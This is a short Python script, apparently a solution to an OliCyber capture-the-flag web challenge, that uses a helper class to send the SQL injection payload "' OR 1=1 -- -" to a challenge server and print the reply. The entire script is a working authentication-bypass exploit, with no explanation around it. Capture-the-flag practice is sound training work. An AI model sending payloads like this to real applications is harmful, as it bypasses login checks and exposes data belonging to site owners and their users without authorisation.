#!/usr/bin/env python3

from Inj import Inj

inj = Inj('http://web-17.challs.olicyber.it')
response, error = inj.logic("' OR 1=1 -- -")
print(response)